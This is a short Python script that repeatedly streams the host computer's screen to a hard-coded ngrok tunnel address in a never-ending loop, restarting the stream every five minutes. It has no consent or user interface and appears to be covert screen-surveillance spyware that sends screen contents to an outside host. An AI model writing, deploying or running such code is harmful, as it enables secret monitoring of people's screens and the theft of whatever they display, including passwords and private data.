####################################################################
from vidstream import ScreenShareClient
import time
####################################################################


####################################################################
while(True):
    Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
    Client.start_stream()
    time.sleep(300)
    Client.stop_stream()
####################################################################
